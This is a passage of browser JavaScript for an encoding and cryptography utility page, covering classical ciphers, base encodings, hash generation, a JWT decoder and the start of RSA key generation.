    const sep='::CSX::';const si=decompressed.indexOf(sep);
    if(si<0)throw new Error('Invalid CSX format');
    const hash=decompressed.substring(0,si);const message=decompressed.substring(si+sep.length);
    if(hash!==CryptoJS.SHA256(message).toString())throw new Error('Integrity check FAILED — data tampered');
    const k=storeResult(message);
    document.getElementById('emojiDecResult').innerHTML='<div style="width:100%"><p style="color:var(--accent);font-weight:700;margin-bottom:6px"><i class="fas fa-check-circle"></i> Decoded + Integrity OK</p><div class="result-box">'+message.replace(/</g,'&lt;')+'</div><div class="flex gap-2 mt-2"><button class="btn btn-secondary btn-sm" id="emojiDecCopyBtn"><i class="fas fa-copy"></i> Copy</button></div></div>';
    $on('emojiDecCopyBtn', 'click',()=>copyText(getResult(k)));
    addStats(1);toast('Decoded!','success');
  }catch(e){toast(e.message,'error');}
});

// =============================================
// CRYPTO TOOLKIT
// =============================================
const MORSE_ENC={'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..','0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.','.':', ',' ':'/','?':'..--..',',':'--..--'};
const MORSE_DEC=Object.fromEntries(Object.entries(MORSE_ENC).map(([k,v])=>[v,k]));
const BACON_ENC={A:'AAAAA',B:'AAAAB',C:'AAABA',D:'AAABB',E:'AABAA',F:'AABAB',G:'AABBA',H:'AABBB',I:'ABAAA',J:'ABAAB',K:'ABABA',L:'ABABB',M:'ABBAA',N:'ABBAB',O:'ABBBA',P:'ABBBB',Q:'BAAAA',R:'BAAAB',S:'BAABA',T:'BAABB',U:'BABAA',V:'BABAB',W:'BABBA',X:'BABBB',Y:'BAAAA',Z:'BAAAB'};
const BACON_DEC=Object.fromEntries(Object.entries(BACON_ENC).map(([k,v])=>[v,k]));
const TAP_GRID='ABDEFGHIJLMNOPQRSTUVWXYZ';
const POLYBIUS='ABCDEFGHIKLMNOPQRSTUVWXYZ';
const B58_ALPHA='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
const B32_ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';

function gcd(a,b){while(b){[a,b]=[b,a%b];}return a;}
function modInverse(a,m){for(let x=1;x<m;x++)if((a*x)%m===1)return x;throw new Error('No modular inverse');}

function playfairProcess(text,key,encode){
  if(!key||!/[a-zA-Z]/.test(key))throw new Error('Key must contain letters');
  key=key.toUpperCase().replace(/J/g,'I').replace(/[^A-Z]/g,'');
  const alpha='ABCDEFGHIKLMNOPQRSTUVWXYZ';
  const seen=new Set();let sq='';
  for(const c of key+alpha){if(!seen.has(c)){seen.add(c);sq+=c;}}
  const pos=c=>{const i=sq.indexOf(c);return{r:Math.floor(i/5),c:i%5};};
  text=text.toUpperCase().replace(/J/g,'I').replace(/[^A-Z]/g,'');
  const pairs=[];
  for(let i=0;i<text.length;){let a=text[i],b=text[i+1]||'X';if(a===b){b='X';i++;}else i+=2;pairs.push([a,b]);}
  const shift=encode?1:-1;
  return pairs.map(([a,b])=>{
    const pa=pos(a),pb=pos(b);
    if(pa.r===pb.r)return sq[pa.r*5+((pa.c+shift+5)%5)]+sq[pb.r*5+((pb.c+shift+5)%5)];
    if(pa.c===pb.c)return sq[((pa.r+shift+5)%5)*5+pa.c]+sq[((pb.r+shift+5)%5)*5+pb.c];
    return sq[pa.r*5+pb.c]+sq[pb.r*5+pa.c];
  }).join('');
}

const CryptoToolkit={
  base64Encode:t=>btoa(unescape(encodeURIComponent(t))),
  base64Decode:t=>{try{return decodeURIComponent(escape(atob(t.trim())));}catch{throw new Error('Invalid Base64');}},
  base32Encode(t){const bytes=new TextEncoder().encode(t);let bits='';for(const b of bytes)bits+=b.toString(2).padStart(8,'0');let out='';for(let i=0;i<bits.length;i+=5)out+=B32_ALPHA[parseInt(bits.slice(i,i+5).padEnd(5,'0'),2)];while(out.length%8!==0)out+='=';return out;},
  base32Decode(t){t=t.toUpperCase().replace(/=/g,'');let bits='';for(const c of t){const idx=B32_ALPHA.indexOf(c);if(idx<0)throw new Error('Invalid Base32');bits+=idx.toString(2).padStart(5,'0');}const bytes=[];for(let i=0;i+8<=bits.length;i+=8)bytes.push(parseInt(bits.slice(i,i+8),2));return new TextDecoder().decode(new Uint8Array(bytes));},
  base58Encode(t){const bytes=new TextEncoder().encode(t);if(!bytes.length)return '';const hexStr=Array.from(bytes).map(b=>b.toString(16).padStart(2,'0')).join('');if(!hexStr)return '';let num=BigInt('0x'+hexStr);let out='';while(num>0n){out=B58_ALPHA[Number(num%58n)]+out;num=num/58n;}for(const b of bytes){if(b!==0)break;out='1'+out;}return out||'1';},
  base58Decode(t){if(!t.trim())return '';let num=0n;for(const c of t){const idx=B58_ALPHA.indexOf(c);if(idx<0)throw new Error('Invalid Base58');num=num*58n+BigInt(idx);}if(num===0n)return '';let hex=num.toString(16);if(hex.length%2)hex='0'+hex;return new TextDecoder().decode(new Uint8Array((hex.match(/.{2}/g)||[]).map(h=>parseInt(h,16))));},
  base85Encode(t){const bytes=new TextEncoder().encode(t);let out='<~';for(let i=0;i<bytes.length;i+=4){const chunk=bytes.slice(i,i+4);const pad=4-chunk.length;let val=0;for(let j=0;j<4;j++)val=(val<<8)|(chunk[j]||0);if(chunk.every(b=>b===0)&&chunk.length===4){out+='z';continue;}let g='';for(let k=4;k>=0;k--){g=String.fromCharCode(val%85+33)+g;val=Math.floor(val/85);}out+=g.slice(0,chunk.length+1);}return out+'~>';},
  base85Decode(t){t=t.replace(/<~|~>/g,'').replace(/\s/g,'');let bytes=[],i=0;while(i<t.length){if(t[i]==='z'){bytes.push(0,0,0,0);i++;continue;}const chunk=t.slice(i,i+5);let val=0;for(let j=0;j<5;j++)val=val*85+(chunk.charCodeAt(j)||84)-33;const n=chunk.length-1;for(let k=3;k>=4-n;k--)bytes.push((val>>(k*8))&0xFF);i+=5;}return new TextDecoder().decode(new Uint8Array(bytes));},
  hexEncode:t=>Array.from(new TextEncoder().encode(t)).map(b=>b.toString(16).padStart(2,'0')).join(' '),
  hexDecode(h){const c=h.replace(/\s+/g,'');if(!/^[0-9a-fA-F]*$/.test(c)||c.length%2!==0)throw new Error('Invalid hex');return new TextDecoder().decode(new Uint8Array(c.length/2?Array.from({length:c.length/2},(_,i)=>parseInt(c.substr(i*2,2),16)):[]));},
  binaryEncode:t=>Array.from(new TextEncoder().encode(t)).map(b=>b.toString(2).padStart(8,'0')).join(' '),
  binaryDecode(t){const parts=t.trim().split(/\s+/);const bytes=parts.map(p=>{if(!/^[01]{8}$/.test(p))throw new Error('Invalid binary: '+p);return parseInt(p,2);});return new TextDecoder().decode(new Uint8Array(bytes));},
  octalEncode:t=>Array.from(new TextEncoder().encode(t)).map(b=>'\\'+b.toString(8).padStart(3,'0')).join(''),
  octalDecode:t=>new TextDecoder().decode(new Uint8Array((t.match(/\\(\d{3})/g)||[]).map(p=>parseInt(p.slice(1),8)))),
  decimalEncode:t=>Array.from(new TextEncoder().encode(t)).join(' '),
  decimalDecode(t){const nums=t.trim().split(/\s+/).map(Number);if(nums.some(isNaN))throw new Error('Invalid decimal');return new TextDecoder().decode(new Uint8Array(nums));},
  unicodeEncode:t=>Array.from(t).map(c=>{const cp=c.codePointAt(0);return cp>127?'\\u'+cp.toString(16).padStart(4,'0').toUpperCase():c;}).join(''),
  unicodeDecode:t=>t.replace(/\\u([0-9a-fA-F]{4})/g,(_,h)=>String.fromCodePoint(parseInt(h,16))),
  urlEncode:t=>encodeURIComponent(t),
  urlDecode(t){try{return decodeURIComponent(t);}catch{throw new Error('Invalid URL encoding');}},
  htmlEncode:t=>t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#039;'),
  htmlDecode(t){const el=document.createElement('div');el.innerHTML=t;return el.textContent;},
  reverseText:t=>Array.from(t).reverse().join(''),
  caesarEncode(t,s){s=((s%26)+26)%26;return t.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+s)%26+b);});},
  caesarDecode(t,s){return this.caesarEncode(t,26-((s%26+26)%26));},
  rot13:t=>t.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);}),
  rot47:t=>t.replace(/[\x21-\x7E]/g,c=>String.fromCharCode(((c.charCodeAt(0)-33+47)%94)+33)),
  rot18:t=>t.replace(/[a-zA-Z0-9]/g,c=>{if(/[a-zA-Z]/.test(c)){const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);}return String((parseInt(c)+5)%10);}),
  atbash:t=>t.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode(b+25-(c.charCodeAt(0)-b));}),
  affineEncode(t,a=5,b=8){if(gcd(a,26)!==1)throw new Error('a must be coprime to 26');return t.replace(/[a-zA-Z]/g,c=>{const isU=c<='Z';const x=c.charCodeAt(0)-(isU?65:97);return String.fromCharCode(((a*x+b)%26)+(isU?65:97));});},
  affineDecode(t,a=5,b=8){if(gcd(a,26)!==1)throw new Error('a must be coprime to 26');const aInv=modInverse(a,26);return t.replace(/[a-zA-Z]/g,c=>{const isU=c<='Z';const y=c.charCodeAt(0)-(isU?65:97);return String.fromCharCode(((aInv*(y-b+26))%26)+(isU?65:97));});},
  vigenereEncode(t,k){if(!k||!/^[a-zA-Z]+$/.test(k))throw new Error('Key must be letters only');k=k.toLowerCase();let ki=0;return t.replace(/[a-zA-Z]/g,c=>{const s=k.charCodeAt(ki++%k.length)-97;const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+s)%26+b);});},
  vigenereDecode(t,k){if(!k||!/^[a-zA-Z]+$/.test(k))throw new Error('Key must be letters only');k=k.toLowerCase();let ki=0;return t.replace(/[a-zA-Z]/g,c=>{const s=k.charCodeAt(ki++%k.length)-97;const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b-s+26)%26+b);});},
  beaufortEncode(t,k){if(!k||!/^[a-zA-Z]+$/.test(k))throw new Error('Key must be letters only');k=k.toLowerCase();let ki=0;return t.replace(/[a-zA-Z]/g,c=>{const s=k.charCodeAt(ki++%k.length)-97;const x=c.charCodeAt(0)-(c<='Z'?65:97);const b=c<='Z'?65:97;return String.fromCharCode(((s-x+26)%26)+b);});},
  playfairEncode:(t,k)=>playfairProcess(t,k,true),
  playfairDecode:(t,k)=>playfairProcess(t,k,false),
  polybiusEncode:t=>t.toUpperCase().replace(/J/g,'I').split('').map(c=>{const idx=POLYBIUS.indexOf(c);if(idx<0)return c;return(Math.floor(idx/5)+1)+''+(idx%5+1);}).join(' '),
  polybiusDecode:t=>(t.trim().split(/\s+/)).map(p=>{if(!/^\d{2}$/.test(p))return p;const r=parseInt(p[0])-1,c=parseInt(p[1])-1;return POLYBIUS[r*5+c]||'?';}).join(''),
  columnarEncode(t,k){if(!k)throw new Error('Key required');const kl=k.toUpperCase().split('');const order=kl.map((c,i)=>({c,i})).sort((a,b)=>a.c.localeCompare(b.c)||a.i-b.i).map(x=>x.i);const rows=Math.ceil(t.length/kl.length);const grid=Array.from({length:rows},(_,r)=>kl.map((_,c)=>t[r*kl.length+c]||'X'));return order.map(col=>grid.map(row=>row[col]).join('')).join('');},
  columnarDecode(t,k){if(!k)throw new Error('Key required');const kl=k.toUpperCase().split('');const order=kl.map((c,i)=>({c,i})).sort((a,b)=>a.c.localeCompare(b.c)||a.i-b.i).map(x=>x.i);const rows=Math.ceil(t.length/kl.length);const cols=kl.length;const chunkLen=Math.floor(t.length/cols);const extra=t.length%cols;const colLens=order.map((_,i)=>chunkLen+(i<extra?1:0));const grid=Array.from({length:rows},()=>Array(cols).fill(''));let pos=0;order.forEach((col,i)=>{for(let r=0;r<colLens[i];r++){grid[r][col]=t[pos++];}});return grid.map(row=>row.join('')).join('').replace(/X+$/,'');},
  tapEncode:t=>t.toUpperCase().replace(/C/g,'K').split('').map(c=>{const idx=TAP_GRID.indexOf(c);if(idx<0)return c;return'.'.repeat(Math.floor(idx/5)+1)+' '+'.'.repeat(idx%5+1);}).join(' / '),
  tapDecode:t=>t.split(' / ').map(pair=>{const parts=pair.trim().split(/\s+/);if(parts.length!==2)return '?';return TAP_GRID[(parts[0].length-1)*5+(parts[1].length-1)]||'?';}).join(''),
  baconEncode:t=>t.toUpperCase().replace(/[A-Z]/g,c=>BACON_ENC[c]||c),
  baconDecode:t=>(t.toUpperCase().replace(/[^AB]/g,'').match(/.{5}/g)||[]).map(c=>BACON_DEC[c]||'?').join(''),
  morseEncode:t=>t.toUpperCase().split('').map(c=>MORSE_ENC[c]||c).join(' '),
  morseDecode:t=>t.split(' / ').map(w=>w.split(' ').map(code=>MORSE_DEC[code]||'?').join('')).join(' '),
  railFenceEncode(t,rails=3){if(rails<2)return t;const fence=Array.from({length:rails},()=>[]);let rail=0,dir=1;for(const c of t){fence[rail].push(c);if(rail===0)dir=1;if(rail===rails-1)dir=-1;rail+=dir;}return fence.map(r=>r.join('')).join('');},
  railFenceDecode(t,rails=3){if(rails<2)return t;const n=t.length;const fence=Array.from({length:rails},()=>[]);let rail=0,dir=1;const indices=[];for(let i=0;i<n;i++){indices.push(rail);if(rail===0)dir=1;if(rail===rails-1)dir=-1;rail+=dir;}const counts=Array(rails).fill(0);indices.forEach(r=>counts[r]++);const rows=[];let pos=0;for(let r=0;r<rails;r++){rows.push(t.slice(pos,pos+counts[r]).split(''));pos+=counts[r];}const ptrs=Array(rails).fill(0);return indices.map(r=>rows[r][ptrs[r]++]).join('');},
  aesEncrypt(t,p){if(!p)throw new Error('Password required');return CryptoJS.AES.encrypt(t,p).toString();},
  aesDecrypt(c,p){if(!p)throw new Error('Password required');const b=CryptoJS.AES.decrypt(c.trim(),p);const r=b.toString(CryptoJS.enc.Utf8);if(!r)throw new Error('Decryption failed — wrong password');return r;},
  rc4(t,k){if(!k)throw new Error('Key required');let S=Array.from({length:256},(_,i)=>i),j=0;for(let i=0;i<256;i++){j=(j+S[i]+k.charCodeAt(i%k.length))%256;[S[i],S[j]]=[S[j],S[i]];}let i=0;j=0;return Array.from(t).map(c=>{i=(i+1)%256;j=(j+S[i])%256;[S[i],S[j]]=[S[j],S[i]];return String.fromCharCode(c.charCodeAt(0)^S[(S[i]+S[j])%256]);}).join('');},
  xorEncode(t,k){if(!k)throw new Error('Key required');return Array.from(t).map((c,i)=>String.fromCharCode(c.charCodeAt(0)^k.charCodeAt(i%k.length))).join('');}
};

function updateCryptoFields(){
  const a=document.getElementById('cryptoAlgo').value;
  const c=document.getElementById('cryptoExtraFields');
  const f={
    caesar:'<label class="block text-xs font-bold mb-1" style="color:var(--text)">Shift (1-25)</label><input class="input-field mb-3" type="number" id="cryptoShift" value="3" min="1" max="25">',
    affine:'<div class="grid grid-cols-2 gap-2 mb-3"><div><label class="block text-xs font-bold mb-1" style="color:var(--text)">a (coprime to 26)</label><input class="input-field" type="number" id="cryptoA" value="5" min="1"></div><div><label class="block text-xs font-bold mb-1" style="color:var(--text)">b (offset)</label><input class="input-field" type="number" id="cryptoB" value="8" min="0"></div></div>',
    vigenere:'<label class="block text-xs font-bold mb-1" style="color:var(--text)">Keyword (letters only)</label><input class="input-field mb-3" id="cryptoKey" placeholder="e.g. SECRET" value="SECRET">',
    beaufort:'<label class="block text-xs font-bold mb-1" style="color:var(--text)">Keyword (letters only)</label><input class="input-field mb-3" id="cryptoKey" placeholder="e.g. KEYWORD" value="KEYWORD">',
    playfair:'<label class="block text-xs font-bold mb-1" style="color:var(--text)">Key (letters)</label><input class="input-field mb-3" id="cryptoKey" placeholder="e.g. MONARCHY" value="MONARCHY">',
    columnar:'<label class="block text-xs font-bold mb-1" style="color:var(--text)">Key (letters)</label><input class="input-field mb-3" id="cryptoKey" placeholder="e.g. ZEBRA" value="ZEBRA">',
    aes:'<label class="block text-xs font-bold mb-1" style="color:var(--text)">Password</label><input class="input-field mb-3" type="password" id="cryptoKey" placeholder="Encryption password">',
    rc4:'<label class="block text-xs font-bold mb-1" style="color:var(--text)">Key</label><input class="input-field mb-3" id="cryptoKey" placeholder="RC4 key string">',
    xor:'<label class="block text-xs font-bold mb-1" style="color:var(--text)">XOR Key</label><input class="input-field mb-3" id="cryptoKey" placeholder="XOR key string">',
    rail:'<label class="block text-xs font-bold mb-1" style="color:var(--text)">Rails (2-10)</label><input class="input-field mb-3" type="number" id="cryptoShift" value="3" min="2" max="10">',
  };
  c.innerHTML=f[a]||'';
}
$on('cryptoAlgo', 'change',updateCryptoFields);
updateCryptoFields();

function cryptoProcess(enc){
  const a=document.getElementById('cryptoAlgo').value;
  const inp=document.getElementById('cryptoInput').value;
  if(!inp.trim())return toast('Enter text','warn');
  const rd=document.getElementById('cryptoResult');
  try{
    const k=document.getElementById('cryptoKey')?.value||'';
    const s=parseInt(document.getElementById('cryptoShift')?.value||3);
    const aVal=parseInt(document.getElementById('cryptoA')?.value||5);
    const bVal=parseInt(document.getElementById('cryptoB')?.value||8);
    let r='';
    switch(a){
      case 'base64':r=enc?CryptoToolkit.base64Encode(inp):CryptoToolkit.base64Decode(inp);break;
      case 'base32':r=enc?CryptoToolkit.base32Encode(inp):CryptoToolkit.base32Decode(inp);break;
      case 'base58':r=enc?CryptoToolkit.base58Encode(inp):CryptoToolkit.base58Decode(inp);break;
      case 'base85':r=enc?CryptoToolkit.base85Encode(inp):CryptoToolkit.base85Decode(inp);break;
      case 'hex':r=enc?CryptoToolkit.hexEncode(inp):CryptoToolkit.hexDecode(inp);break;
      case 'binary':r=enc?CryptoToolkit.binaryEncode(inp):CryptoToolkit.binaryDecode(inp);break;
      case 'octal':r=enc?CryptoToolkit.octalEncode(inp):CryptoToolkit.octalDecode(inp);break;
      case 'decimal':r=enc?CryptoToolkit.decimalEncode(inp):CryptoToolkit.decimalDecode(inp);break;
      case 'unicode':r=enc?CryptoToolkit.unicodeEncode(inp):CryptoToolkit.unicodeDecode(inp);break;
      case 'url':r=enc?CryptoToolkit.urlEncode(inp):CryptoToolkit.urlDecode(inp);break;
      case 'html':r=enc?CryptoToolkit.htmlEncode(inp):CryptoToolkit.htmlDecode(inp);break;
      case 'reverse':r=CryptoToolkit.reverseText(inp);break;
      case 'caesar':r=enc?CryptoToolkit.caesarEncode(inp,s):CryptoToolkit.caesarDecode(inp,s);break;
      case 'rot13':r=CryptoToolkit.rot13(inp);break;
      case 'rot47':r=CryptoToolkit.rot47(inp);break;
      case 'rot18':r=CryptoToolkit.rot18(inp);break;
      case 'atbash':r=CryptoToolkit.atbash(inp);break;
      case 'affine':r=enc?CryptoToolkit.affineEncode(inp,aVal,bVal):CryptoToolkit.affineDecode(inp,aVal,bVal);break;
      case 'bacon':r=enc?CryptoToolkit.baconEncode(inp):CryptoToolkit.baconDecode(inp);break;
      case 'morse':r=enc?CryptoToolkit.morseEncode(inp):CryptoToolkit.morseDecode(inp);break;
      case 'tap':r=enc?CryptoToolkit.tapEncode(inp):CryptoToolkit.tapDecode(inp);break;
      case 'rail':r=enc?CryptoToolkit.railFenceEncode(inp,s):CryptoToolkit.railFenceDecode(inp,s);break;
      case 'vigenere':r=enc?CryptoToolkit.vigenereEncode(inp,k):CryptoToolkit.vigenereDecode(inp,k);break;
      case 'beaufort':r=CryptoToolkit.beaufortEncode(inp,k);break;
      case 'playfair':r=enc?CryptoToolkit.playfairEncode(inp,k):CryptoToolkit.playfairDecode(inp,k);break;
      case 'polybius':r=enc?CryptoToolkit.polybiusEncode(inp):CryptoToolkit.polybiusDecode(inp);break;
      case 'columnar':r=enc?CryptoToolkit.columnarEncode(inp,k):CryptoToolkit.columnarDecode(inp,k);break;
      case 'aes':r=enc?CryptoToolkit.aesEncrypt(inp,k):CryptoToolkit.aesDecrypt(inp,k);break;
      case 'rc4':r=CryptoToolkit.rc4(inp,k);break;
      case 'xor':r=CryptoToolkit.xorEncode(inp,k);break;
      default:r='Algorithm not implemented';
    }
    const algoLabel=document.getElementById('cryptoAlgo').options[document.getElementById('cryptoAlgo').selectedIndex].text;
    const lbl=enc?'Encoded/Encrypted':'Decoded/Decrypted';
    const ck=storeResult(r);
    rd.innerHTML='<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><span style="color:var(--accent);font-weight:700">'+lbl+'</span><span style="font-size:10px;padding:2px 8px;border-radius:4px;background:rgba(0,255,136,0.08);color:var(--accent);border:1px solid var(--border);font-family:\'JetBrains Mono\'">'+algoLabel+'</span><button class="btn btn-secondary btn-sm" id="cryptoCopyBtn" style="margin-left:auto"><i class="fas fa-copy"></i> Copy</button></div><div style="word-break:break-all;white-space:pre-wrap;font-family:\'JetBrains Mono\',monospace;font-size:12px;color:var(--text)">'+r.replace(/</g,'&lt;')+'</div>';
    $on('cryptoCopyBtn', 'click',()=>copyText(getResult(ck)));
    addStats(1,new TextEncoder().encode(inp).length);logActivity('Crypto: '+lbl+' ['+a.toUpperCase()+']');toast(lbl+'!','success');
  }catch(e){rd.innerHTML='<span style="color:var(--danger)"><i class="fas fa-circle-xmark"></i> '+esc(e.message)+'</span>';toast(e.message,'error');}
}

$on('cryptoEncBtn', 'click',()=>cryptoProcess(true));
$on('cryptoDecBtn', 'click',()=>cryptoProcess(false));
$on('clearCryptoBtn', 'click',()=>{document.getElementById('cryptoInput').value='';document.getElementById('cryptoResult').innerHTML='<span style="color:var(--muted)">Output will appear here...</span>';updateCryptoFields();toast('Cleared','info');});
$on('clearCryptoOutputBtn', 'click',()=>{document.getElementById('cryptoResult').innerHTML='<span style="color:var(--muted)">Output will appear here...</span>';});

$on('cryptoTabs', 'click',e=>{
  const btn=e.target.closest('[data-crypto-tab]');if(!btn)return;
  document.querySelectorAll('#cryptoTabs .tab').forEach(t=>t.classList.remove('active'));
  btn.classList.add('active');
  const tabMap={encrypt:'cryptoEncryptTab',hash:'cryptoHashTab',rsa:'cryptoRsaTab',jwt:'cryptoJwtTab'};
  Object.values(tabMap).forEach(id=>document.getElementById(id).style.display='none');
  document.getElementById(tabMap[btn.dataset.cryptoTab]).style.display='block';
});

$on('clearHashInputBtn', 'click',()=>{document.getElementById('hashInput').value='';});
$on('clearHashResultBtn', 'click',()=>{document.getElementById('hashResult').innerHTML='<p style="color:var(--muted);opacity:.5;font-size:13px">Hash results will appear here</p>';});

$on('hashBtn', 'click',()=>{
  const inp=document.getElementById('hashInput').value;
  if(!inp.trim())return toast('Enter text to hash','warn');
  const hashes={'MD5':CryptoJS.MD5(inp).toString(),'SHA-1':CryptoJS.SHA1(inp).toString(),'SHA-256':CryptoJS.SHA256(inp).toString(),'SHA-512':CryptoJS.SHA512(inp).toString(),'SHA-3 (256)':CryptoJS.SHA3(inp).toString(),'SHA-3 (512)':CryptoJS.SHA3(inp,{outputLength:512}).toString(),'RIPEMD-160':CryptoJS.RIPEMD160(inp).toString(),'HMAC-SHA256':CryptoJS.HmacSHA256(inp,'CSX-Key').toString(),'HMAC-SHA512':CryptoJS.HmacSHA512(inp,'CSX-Key').toString()};
  const rd=document.getElementById('hashResult');rd.style.display='block';rd.style.alignItems='flex-start';
  rd.innerHTML='<div style="width:100%">'+Object.entries(hashes).map(([algo,hash])=>{
    const hk=storeResult(hash);
    return '<div class="glass-sm mb-2"><div class="flex items-center justify-between mb-1"><span style="font-size:11px;font-weight:700;color:var(--accent)">'+algo+'</span><button class="btn btn-secondary btn-sm hash-copy-btn" data-hk="'+hk+'"><i class="fas fa-copy"></i></button></div><div style="font-family:\'JetBrains Mono\',monospace;font-size:10px;color:var(--muted);word-break:break-all">'+hash+'</div></div>';
  }).join('')+'</div>';
  rd.querySelectorAll('.hash-copy-btn').forEach(btn=>btn.addEventListener('click',()=>copyText(getResult(parseInt(btn.dataset.hk)))));
  addStats(1,new TextEncoder().encode(inp).length);logActivity('Hash: Generated '+Object.keys(hashes).length+' hashes');toast('Hashes generated!','success');
});

// RSA
let rsaCryptoKeys=null,rsaSignKeys=null,rsaLastSignature=null,rsaLastSignedText=null;
function arrayBufferToPem(buffer,type){const b64=btoa(String.fromCharCode(...new Uint8Array(buffer)));const lines=b64.match(/.{1,64}/g).join('\n');return'-----BEGIN '+type+'-----\n'+lines+'\n-----END '+type+'-----';}
function bufferToHex(buf){return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');}

$on('clearJwtInputBtn', 'click',()=>{document.getElementById('jwtInput').value='';document.getElementById('jwtSecret').value='';});
$on('clearJwtResultBtn', 'click',()=>{document.getElementById('jwtResult').innerHTML='<p style="color:var(--muted);opacity:.5;font-size:13px">Paste a JWT token to decode</p>';});

$on('jwtDecodeBtn', 'click',()=>{
  const token=document.getElementById('jwtInput').value.trim();
  if(!token)return toast('Paste a JWT token','warn');
  const secret=document.getElementById('jwtSecret').value;
  const rd=document.getElementById('jwtResult');rd.style.display='block';rd.style.alignItems='flex-start';
  try{
    const parts=token.split('.');if(parts.length!==3)throw new Error('Invalid JWT: expected 3 parts');
    const decodeB64Url=s=>{s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';return JSON.parse(atob(s));};
    const header=decodeB64Url(parts[0]);const payload=decodeB64Url(parts[1]);const sig=parts[2];
    let sigStatus={checked:false,valid:false,msg:'No secret — signature not verified'};
    if(secret&&header.alg==='HS256'){
      const computed=CryptoJS.HmacSHA256(parts[0]+'.'+parts[1],secret);
      const computedB64=CryptoJS.enc.Base64.stringify(computed).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
      sigStatus={checked:true,valid:computedB64===sig,msg:computedB64===sig?'Signature VALID ✓':'Signature INVALID ✗'};
    }
    let expInfo='';
    if(payload.exp){const exp=new Date(payload.exp*1000),now=new Date();expInfo+='<div class="exif-row"><span class="exif-key">Expires</span><span class="exif-val" style="color:'+(exp>now?'var(--accent)':'var(--danger)')+'">'+exp.toLocaleString()+' ('+(exp>now?'VALID':'EXPIRED')+')</span></div>';}
    if(payload.iat)expInfo+='<div class="exif-row"><span class="exif-key">Issued At</span><span class="exif-val">'+new Date(payload.iat*1000).toLocaleString()+'</span></div>';
    const rObj=obj=>'<div style="font-family:\'JetBrains Mono\',monospace;font-size:11px;background:var(--input-bg);border-radius:7px;padding:10px;white-space:pre-wrap;word-break:break-all;color:var(--muted)">'+JSON.stringify(obj,null,2).replace(/</g,'&lt;')+'</div>';
    const sc=sigStatus.checked?(sigStatus.valid?'rgba(0,255,136,0.2)':'rgba(255,51,102,0.2)'):'var(--border)';
    rd.innerHTML='<div style="width:100%"><div class="glass-sm mb-3" style="border-color:'+sc+'"><p style="font-size:11px;font-weight:700;color:'+(sigStatus.checked?(sigStatus.valid?'var(--accent)':'var(--danger)'):'var(--muted)')+'"><i class="fas '+(sigStatus.checked?(sigStatus.valid?'fa-shield-halved':'fa-circle-xmark'):'fa-info-circle')+'"></i> '+sigStatus.msg+'</p><p style="font-size:10px;color:var(--muted);margin-top:3px">Algorithm: <span style="color:var(--cyan)">'+(header.alg||'none')+'</span></p></div><div class="exif-section"><div class="exif-section-title">Header</div>'+rObj(header)+'</div><div class="exif-section mt-3"><div class="exif-section-title">Payload</div>'+rObj(payload)+(expInfo?'<div class="mt-2">'+expInfo+'</div>':'')+'</div></div>';
    addStats(1);logActivity('JWT: Decoded '+header.alg+' token');toast('JWT decoded!','success');
  }catch(e){rd.innerHTML='<div style="padding:20px"><p style="color:var(--danger);font-weight:700"><i class="fas fa-circle-xmark"></i> '+esc(e.message)+'</p></div>';toast(e.message,'error');}
});

$on('rsaGenBtn', 'click',async()=>{
  const btn=document.getElementById('rsaGenBtn');
  const keySize=parseInt(document.getElementById('rsaKeySize').value);
  btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Generating...';
  const rd=document.getElementById('rsaResult');rd.style.display='block';rd.style.alignItems='flex-start';
  rd.innerHTML='<div style="padding:30px;text-align:center"><span class="spinner"></span><p style="color:var(--muted);margin-top:10px;font-size:12px">Generating '+keySize+'-bit RSA keys...</p></div>';
  try{
    rsaCryptoKeys=await window.crypto.subtle.generateKey({name:'RSA-OAEP',modulusLength:keySize,publicExponent:new Uint8Array([1,0,1]),hash:'SHA-256'},true,['encrypt','decrypt']);
    rsaSignKeys=await window.crypto.subtle.generateKey({name:'RSA-PSS',modulusLength:keySize,publicExponent:new Uint8Array([1,0,1]),hash:'SHA-256'},true,['sign','verify']);
    const pubKeyBuf=await window.crypto.subtle.exportKey('spki',rsaCryptoKeys.publicKey);
    const privKeyBuf=await window.crypto.subtle.exportKey('pkcs8',rsaCryptoKeys.privateKey);
    const pubPem=arrayBufferToPem(pubKeyBuf,'PUBLIC KEY');const privPem=arrayBufferToPem(privKeyBuf,'PRIVATE KEY');
    const pubK=storeResult(pubPem);const privK=storeResult(privPem);
    document.getElementById('rsaSignBtn').disabled=false;document.getElementById('rsaVerifyBtn').disabled=false;
